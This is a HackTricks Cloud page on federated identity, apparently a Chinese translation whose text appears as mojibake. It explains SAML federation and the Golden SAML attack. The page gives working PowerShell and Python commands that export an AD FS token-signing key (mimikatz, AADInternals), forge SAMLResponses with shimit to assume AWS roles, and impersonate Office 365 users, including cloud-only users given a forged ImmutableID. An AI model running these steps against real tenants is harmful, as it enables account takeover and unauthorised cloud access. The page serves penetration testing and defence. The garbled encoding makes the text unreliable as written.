# è”åˆèº«ä»½

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—å¥½å¤„ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆçš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

**è”åˆèº«ä»½**æ˜¯ä¸€ç»„å·²å»ºç«‹**ä¿¡ä»»**çš„**åŸŸ**çš„é›†åˆã€‚ä¿¡ä»»çš„çº§åˆ«å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒï¼Œä½†é€šå¸¸åŒ…æ‹¬**èº«ä»½éªŒè¯**ï¼Œå¹¶ä¸”å‡ ä¹æ€»æ˜¯åŒ…æ‹¬**æˆæƒ**ã€‚ä¸€ä¸ªå…¸å‹çš„è”åˆå¯èƒ½åŒ…æ‹¬ä¸€äº›å·²å»ºç«‹**ä¿¡ä»»**ä»¥ä¾¿å¯¹ä¸€ç»„èµ„æºè¿›è¡Œ**å…±äº«è®¿é—®**çš„ç»„ç»‡ã€‚

æ‚¨å¯ä»¥å°†æ‚¨çš„**æœ¬åœ°ç¯å¢ƒ**ä¸Azure ADè¿›è¡Œ**è”åˆ**ï¼Œå¹¶å°†æ­¤è”åˆç”¨äºèº«ä»½éªŒè¯å’Œæˆæƒã€‚è¿™ç§ç™»å½•æ–¹æ³•ç¡®ä¿æ‰€æœ‰ç”¨æˆ·çš„**èº«ä»½éªŒè¯å‘ç”Ÿåœ¨æœ¬åœ°**ã€‚æ­¤æ–¹æ³•å…è®¸ç®¡ç†å‘˜å®æ–½æ›´ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶çº§åˆ«ã€‚æ”¯æŒä¸**AD FS**å’ŒPingFederateçš„è”åˆã€‚

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

åŸºæœ¬ä¸Šï¼Œåœ¨è”åˆä¸­ï¼Œæ‰€æœ‰çš„**èº«ä»½éªŒè¯**éƒ½å‘ç”Ÿåœ¨**æœ¬åœ°**ç¯å¢ƒä¸­ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡ä½¿ç”¨ä»–ä»¬çš„**æœ¬åœ°å‡­æ®**æ¥è®¿é—®**äº‘**åº”ç”¨ç¨‹åºã€‚

**å®‰å…¨æ–­è¨€æ ‡è®°è¯­è¨€ï¼ˆSAMLï¼‰**ç”¨äºåœ¨æä¾›è€…ä¹‹é—´**äº¤æ¢**æ‰€æœ‰çš„èº«ä»½éªŒè¯å’Œæˆæƒ**ä¿¡æ¯**ã€‚

åœ¨ä»»ä½•è”åˆè®¾ç½®ä¸­ï¼Œéƒ½æœ‰ä¸‰ä¸ªå‚ä¸æ–¹ï¼š

* ç”¨æˆ·æˆ–å®¢æˆ·ç«¯
* èº«ä»½æä¾›è€…ï¼ˆIdPï¼‰
* æœåŠ¡æä¾›è€…ï¼ˆSPï¼‰

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. é¦–å…ˆï¼Œç”¨æˆ·**å°è¯•è®¿é—®ä¸€ä¸ªåº”ç”¨ç¨‹åº**ï¼ˆä¹Ÿç§°ä¸ºSPï¼Œå³æœåŠ¡æä¾›è€…ï¼‰ï¼Œè¯¥åº”ç”¨ç¨‹åºå¯èƒ½æ˜¯AWSæ§åˆ¶å°ã€vSphere Webå®¢æˆ·ç«¯ç­‰ã€‚æ ¹æ®å®ç°æ–¹å¼ï¼Œå®¢æˆ·ç«¯å¯èƒ½ç›´æ¥å…ˆè®¿é—®IdPï¼Œè·³è¿‡æ­¤å›¾è¡¨ä¸­çš„ç¬¬ä¸€æ­¥ã€‚
2. ç„¶åï¼Œåº”ç”¨ç¨‹åº**æ£€æµ‹åˆ°IdP**ï¼ˆå³èº«ä»½æä¾›è€…ï¼Œå¯ä»¥æ˜¯AD FSã€Oktaç­‰ï¼‰ä»¥å¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ï¼Œ**ç”ŸæˆSAML AuthnRequest**å¹¶å°†å®¢æˆ·ç«¯é‡å®šå‘åˆ°IdPã€‚
3. **IdPå¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯**ï¼Œ**åˆ›å»ºSAMLResponse**å¹¶é€šè¿‡ç”¨æˆ·å°†å…¶å‘é€ç»™SPã€‚
4. SP **æ£€æŸ¥SAMLResponse**å¹¶**ç™»å½•ç”¨æˆ·**ã€‚SPå¿…é¡»ä¸IdPå»ºç«‹ä¿¡ä»»å…³ç³»ã€‚ç”¨æˆ·ç°åœ¨å¯ä»¥ä½¿ç”¨è¯¥æœåŠ¡ã€‚

**å¦‚æœæ‚¨æƒ³äº†è§£æ›´å¤šå…³äºSAMLèº«ä»½éªŒè¯å’Œå¸¸è§æ”»å‡»çš„ä¿¡æ¯ï¼Œè¯·è®¿é—®ï¼š**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## æ¢çº½

* AD FSæ˜¯åŸºäºå£°æ˜çš„èº«ä»½æ¨¡å‹ã€‚
* "..å£°æ˜åªæ˜¯å…³äºç”¨æˆ·çš„é™ˆè¿°ï¼ˆä¾‹å¦‚ï¼Œåç§°ã€èº«ä»½ã€ç»„ï¼‰ï¼Œä¸»è¦ç”¨äºæˆæƒè®¿é—®ä½äºäº’è”ç½‘ä¸Šä»»ä½•ä½ç½®çš„åŸºäºå£°æ˜çš„åº”ç”¨ç¨‹åºã€‚"
* ç”¨æˆ·çš„å£°æ˜å†™åœ¨SAMLä»¤ç‰Œä¸­ï¼Œç„¶åç”±IdPç­¾åä»¥æä¾›æœºå¯†æ€§ã€‚
* ç”¨æˆ·ç”±ImmutableIDæ ‡è¯†ã€‚å®ƒåœ¨Azure ADä¸­æ˜¯å…¨å±€å”¯ä¸€çš„å¹¶å­˜å‚¨åœ¨å…¶ä¸­ã€‚
* ImmutableIDå­˜å‚¨åœ¨æœ¬åœ°ä½œä¸ºç”¨æˆ·çš„asm-DS-ConsistencyGuidï¼Œæˆ–è€…å¯ä»¥ä»ç”¨æˆ·çš„GUIDæ´¾ç”Ÿè€Œæ¥ã€‚
* æ›´å¤šä¿¡æ¯è¯·å‚è§[https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAMLæ”»å‡»ï¼š**

* åœ¨ADFSä¸­ï¼ŒSAMLå“åº”ç”±ä»¤ç‰Œç­¾åè¯ä¹¦ç­¾åã€‚
* å¦‚æœè¯ä¹¦è¢«æ”»å‡»è€…è·å–ï¼Œå°±å¯ä»¥ä½œä¸ºä»»ä½•åŒæ­¥åˆ°Azure ADçš„ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ï¼
* å°±åƒæˆ‘ä»¬æ»¥ç”¨PTAä¸€æ ·ï¼Œæ›´æ”¹ç”¨æˆ·çš„å¯†ç æˆ–å¤šå› ç´ èº«ä»½éªŒè¯éƒ½ä¸ä¼šäº§ç”Ÿä»»ä½•å½±å“ï¼Œå› ä¸ºæˆ‘ä»¬æ­£åœ¨ä¼ªé€ èº«ä»½éªŒè¯å“åº”ã€‚
* è¯ä¹¦å¯ä»¥ä»å…·æœ‰DAæƒé™çš„AD FSæœåŠ¡å™¨ä¸­æå–ï¼Œç„¶åå¯ä»¥ä»ä»»ä½•è¿æ¥åˆ°äº’è”ç½‘çš„è®¡ç®—æœºä¸Šä½¿ç”¨ã€‚
* æ›´å¤šä¿¡æ¯è¯·å‚è§[https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

ä»å‰é¢çš„å›¾è¡¨ä¸­ï¼Œæœ€æœ‰è¶£çš„éƒ¨åˆ†æ˜¯ç¬¬ä¸‰éƒ¨åˆ†ï¼Œå³**IdP**ç”Ÿæˆæˆæƒç”¨æˆ·ç™»å½•çš„**SAMLResponse**ã€‚æ ¹æ®ç‰¹å®šçš„IdPå®ç°ï¼Œ**å“åº”**å¯èƒ½æ˜¯ç”±**IdPçš„ç§é’¥**è¿›è¡Œ**ç­¾å**æˆ–**åŠ å¯†**çš„ã€‚è¿™æ ·ï¼Œ**SPå¯ä»¥éªŒè¯**SAMLResponseç¡®å®æ˜¯ç”±å¯ä¿¡ä»»çš„IdPåˆ›å»ºçš„ã€‚

ç±»ä¼¼äº[é»„é‡‘ç¥¨æ®æ”»å‡»](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)ï¼Œä½¿ç”¨**ç­¾ç½²**åŒ…å«**ç”¨æˆ·èº«ä»½**å’Œ**æƒé™**çš„å¯¹è±¡çš„**å¯†é’¥**ï¼ˆé»„é‡‘ç¥¨æ®ä¸ºKRBTGTï¼Œé»„é‡‘SAMLä¸ºä»¤ç‰Œç­¾åç§é’¥ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ è¿™æ ·ä¸€ä¸ªâ€œèº«ä»½éªŒè¯å¯¹è±¡â€ï¼ˆTGTæˆ–SAMLResponseï¼‰ï¼Œå¹¶å†’å……ä»»ä½•ç”¨æˆ·ä»¥è·å–æœªç»æˆæƒçš„è®¿é—®SPã€‚

æ­¤å¤–ï¼Œé»„é‡‘SAMLå…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š

* å®ƒä»¬å¯ä»¥ä»å‡ ä¹**ä»»ä½•åœ°æ–¹**ç”Ÿæˆã€‚æ‚¨ä¸éœ€è¦æˆä¸ºæ‚¨æ­£åœ¨å¤„ç†çš„ä»»ä½•åŸŸã€è”åˆæˆ–å…¶ä»–ç¯å¢ƒçš„ä¸€éƒ¨åˆ†
* å³ä½¿å¯ç”¨äº†**åŒå› ç´ èº«ä»½éªŒè¯**ï¼Œå®ƒä»¬ä¹Ÿæ˜¯æœ‰æ•ˆçš„
* ä»¤ç‰Œç­¾å**ç§é’¥**ä¸ä¼šè‡ªåŠ¨**æ›´æ–°**
* æ›´æ”¹ç”¨æˆ·çš„**å¯†ç **ä¸ä¼šå½±å“ç”Ÿæˆçš„SAML
#### AWS + AD FS + Golden SAML = â™¥ (æ¡ˆä¾‹ç ”ç©¶)

[Active Directory Federation Services](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) (**AD FS**) æ˜¯ä¸€ç§åŸºäºå¾®è½¯æ ‡å‡†çš„åŸŸæœåŠ¡ï¼Œå…è®¸åœ¨å¯ä¿¡ä»»çš„ä¸šåŠ¡ä¼™ä¼´ä¹‹é—´**å®‰å…¨å…±äº«èº«ä»½ä¿¡æ¯**ï¼ˆè”åˆï¼‰ã€‚å®ƒåŸºæœ¬ä¸Šæ˜¯åŸŸä¸­çš„ä¸€ä¸ªæœåŠ¡ï¼Œä¸ºè”åˆä¸­çš„å…¶ä»–æœåŠ¡æä¾›å•†æä¾›åŸŸç”¨æˆ·èº«ä»½ã€‚

å‡è®¾ AWS **ä¿¡ä»»**ä½ å·²ç»å…¥ä¾µçš„åŸŸï¼ˆåœ¨è”åˆä¸­ï¼‰ï¼Œé‚£ä¹ˆä½ å¯ä»¥åˆ©ç”¨è¿™ç§æ”»å‡»ï¼Œå®é™…ä¸Š**è·å¾—äº‘ç¯å¢ƒä¸­çš„ä»»ä½•æƒé™**ã€‚è¦æ‰§è¡Œæ­¤æ”»å‡»ï¼Œä½ éœ€è¦æ‹¥æœ‰**ç­¾ç½² SAML å¯¹è±¡çš„ç§é’¥**ï¼ˆç±»ä¼¼äºé»„é‡‘ç¥¨æ®ä¸­å¯¹ KRBTGT çš„éœ€æ±‚ï¼‰ã€‚å¯¹äºè¿™ä¸ªç§é’¥ï¼Œä½ ä¸éœ€è¦åŸŸç®¡ç†å‘˜è®¿é—®æƒé™ï¼Œåªéœ€è¦ AD FS ç”¨æˆ·å¸æˆ·ã€‚

ä»¥ä¸‹æ˜¯æ‰§è¡Œé»„é‡‘ SAML æ”»å‡»æ‰€éœ€çš„è¦æ±‚åˆ—è¡¨ï¼š

* **ä»¤ç‰Œç­¾åç§é’¥**
* **IdP å…¬é’¥è¯ä¹¦**
* **IdP åç§°**
* **è§’è‰²åç§°ï¼ˆè¦æ‰®æ¼”çš„è§’è‰²ï¼‰**
* åŸŸ\ç”¨æˆ·å
* AWS ä¸­çš„è§’è‰²ä¼šè¯åç§°
* Amazon å¸æˆ· ID

_å¼ºåˆ¶è¦æ±‚å·²çªå‡ºæ˜¾ç¤ºã€‚å¯¹äºå…¶ä»–éå¼ºåˆ¶å­—æ®µï¼Œä½ å¯ä»¥è¾“å…¥ä»»ä½•ä½ å–œæ¬¢çš„å†…å®¹ã€‚_

å¯¹äº**ç§é’¥**ï¼Œä½ éœ€è¦è®¿é—®**AD FS å¸æˆ·**ï¼Œå¹¶ä»å…¶**ä¸ªäººå­˜å‚¨**ä¸­**å¯¼å‡ºç§é’¥**ï¼ˆå¯ä»¥ä½¿ç”¨å·¥å…·å¦‚ [mimikatz](https://github.com/gentilkiwi/mimikatz) è¿›è¡Œå¯¼å‡ºï¼‰ã€‚å¯¹äºå…¶ä»–è¦æ±‚ï¼Œä½ å¯ä»¥å¯¼å…¥ PowerShell snapin Microsoft.Adfs.Powershell å¹¶æŒ‰ä»¥ä¸‹æ–¹å¼ä½¿ç”¨å®ƒï¼ˆä½ å¿…é¡»ä»¥ ADFS ç”¨æˆ·èº«ä»½è¿è¡Œï¼‰ï¼š
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
æœ‰äº†æ‰€æœ‰è¿™äº›ä¿¡æ¯ï¼Œå¯èƒ½ä¼šå¿˜è®°ä¸€ä¸ªæœ‰æ•ˆçš„SAMLResponseï¼Œä½œä¸ºä½ æƒ³è¦å†’å……çš„ç”¨æˆ·ä½¿ç”¨[**shimit**](https://github.com/cyberark/shimit)**ï¼š**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
### æœ¬åœ° -> äº‘ç«¯

To perform lateral movement from an on-premises environment to the cloud, you can leverage federation with Azure AD Connect. Federation allows you to establish a trust relationship between your on-premises Active Directory (AD) and Azure AD.

è¦ä»æœ¬åœ°ç¯å¢ƒåˆ°äº‘ç«¯æ‰§è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨ä¸Azure AD Connectçš„è”åˆã€‚è”åˆå…è®¸æ‚¨åœ¨æœ¬åœ°Active Directoryï¼ˆADï¼‰å’ŒAzure ADä¹‹é—´å»ºç«‹ä¿¡ä»»å…³ç³»ã€‚

By configuring federation, you can enable single sign-on (SSO) for your users, allowing them to seamlessly access cloud resources using their on-premises credentials. This eliminates the need for users to remember and manage separate credentials for both environments.

é€šè¿‡é…ç½®è”åˆï¼Œæ‚¨å¯ä»¥ä¸ºç”¨æˆ·å¯ç”¨å•ä¸€ç™»å½•ï¼ˆSSOï¼‰ï¼Œä½¿ä»–ä»¬å¯ä»¥ä½¿ç”¨æœ¬åœ°å‡­æ®æ— ç¼è®¿é—®äº‘èµ„æºã€‚è¿™æ¶ˆé™¤äº†ç”¨æˆ·éœ€è¦è®°ä½å’Œç®¡ç†ä¸¤ä¸ªç¯å¢ƒçš„ä¸åŒå‡­æ®çš„éœ€æ±‚ã€‚

To set up federation, you need to install and configure Azure AD Connect on your on-premises environment. This tool synchronizes user accounts and passwords between your on-premises AD and Azure AD.

è¦è®¾ç½®è”åˆï¼Œæ‚¨éœ€è¦åœ¨æœ¬åœ°ç¯å¢ƒä¸­å®‰è£…å’Œé…ç½®Azure AD Connectã€‚è¯¥å·¥å…·åœ¨æœ¬åœ°ADå’ŒAzure ADä¹‹é—´åŒæ­¥ç”¨æˆ·å¸æˆ·å’Œå¯†ç ã€‚

Once federation is established, you can use various techniques to exploit misconfigurations or vulnerabilities in Azure AD Connect to gain unauthorized access to cloud resources.

ä¸€æ—¦å»ºç«‹äº†è”åˆï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å„ç§æŠ€æœ¯æ¥åˆ©ç”¨Azure AD Connectä¸­çš„é…ç½®é”™è¯¯æˆ–æ¼æ´ï¼Œä»¥è·å–å¯¹äº‘èµ„æºçš„æœªç»æˆæƒè®¿é—®ã€‚

Some potential attack vectors include:

ä¸€äº›æ½œåœ¨çš„æ”»å‡»å‘é‡åŒ…æ‹¬ï¼š

- Exploiting weak or default credentials used by Azure AD Connect.
- Exploiting misconfigurations in the synchronization process.
- Exploiting vulnerabilities in the Azure AD Connect software.
- Exploiting privilege escalation vulnerabilities in Azure AD Connect.

- åˆ©ç”¨Azure AD Connectä½¿ç”¨çš„å¼±å¯†ç æˆ–é»˜è®¤å‡­æ®ã€‚
- åˆ©ç”¨åŒæ­¥è¿‡ç¨‹ä¸­çš„é…ç½®é”™è¯¯ã€‚
- åˆ©ç”¨Azure AD Connectè½¯ä»¶ä¸­çš„æ¼æ´ã€‚
- åˆ©ç”¨Azure AD Connectä¸­çš„ç‰¹æƒå‡çº§æ¼æ´ã€‚

By compromising Azure AD Connect, an attacker can potentially gain control over the synchronization process and manipulate user accounts and permissions in both the on-premises and cloud environments.

é€šè¿‡å…¥ä¾µAzure AD Connectï¼Œæ”»å‡»è€…æœ‰å¯èƒ½æ§åˆ¶åŒæ­¥è¿‡ç¨‹å¹¶åœ¨æœ¬åœ°å’Œäº‘ç¯å¢ƒä¸­æ“çºµç”¨æˆ·å¸æˆ·å’Œæƒé™ã€‚

It is important to regularly update and patch Azure AD Connect to mitigate known vulnerabilities and ensure the security of your hybrid identity infrastructure.

å®šæœŸæ›´æ–°å’Œä¿®è¡¥Azure AD Connectä»¥å‡è½»å·²çŸ¥æ¼æ´å¹¶ç¡®ä¿æ··åˆèº«ä»½åŸºç¡€ç»“æ„çš„å®‰å…¨æ€§éå¸¸é‡è¦ã€‚

{% code %}
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
ä¹Ÿå¯ä»¥åˆ›å»ºä»…é™äº‘ç”¨æˆ·çš„ä¸å¯å˜IDï¼Œå¹¶å†’å……ä»–ä»¬ã€‚
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## å‚è€ƒèµ„æ–™

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
